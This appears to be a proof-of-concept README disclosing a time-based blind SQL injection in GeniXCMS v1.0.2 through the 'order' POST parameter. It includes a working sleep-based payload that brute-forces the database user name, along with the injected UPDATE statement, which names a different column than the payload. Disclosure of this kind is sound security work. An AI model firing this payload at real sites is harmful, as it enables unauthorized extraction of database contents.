# geniXCMS_102_sql_inj_poc
A demo PoC to exploit the time-based blind SQL injection vulnerability in latest GeniXCMS v1.0.2

# Notes
This SQL injection bug happened in the file `inc/lib/Control/Backend/menus.control.php` in GeniXCMS v1.0.2(latest) due to the parameter `$_POST['order']` failed to escape evil SQL injection keywords (only single quote has been filtered), and then it is used in a `UPDATE ... SET ...(injectable here)... WHERE ...` SQL statement.

In this demo case, only use `select user()` to burte forcing the current DB user.

Here is menus table in my Testing Lab machine:

```
mysql> select * from menus;
+----+------------+---------+--------+-----+------+-------+-------+-------+
| id | name       | menuid  | parent | sub | type | value | class | order |
+----+------------+---------+--------+-----+------+-------+-------+-------+
|  0 | test menu  | tstMenu | 0      | 0   | cat  | 1     |       | 0     |
|  3 | test menu2 | tstMenu | 0      | 0   | cat  | 1     |       | NULL  |
+----+------------+---------+--------+-----+------+-------+-------+-------+
2 rows in set (0.00 sec)
```

This is the SQL injection payload which will lead to a 3 seconds delay when the correct character is found:

```
order[0][order`=1 and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name]
```

This is the SQL UPDATE statement after the payload injected, if the first character of DB user is 'r' then the server response will be delayed by 3 seconds:
```
UPDATE `menus` SET `id`='1' and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name` = '1', WHERE `id` = '0' LIMIT 1;
```

# Reference
This vulnerability is discovered by `ADLab of Venustech`, and more detail can be found in [here][1]



<!--- Reference -->

[1]: https://github.com/semplon/GeniXCMS/issues/71#issuecomment-279409812				"SQL injection vulnerability in GeniXCMS v1.0.2(latest)"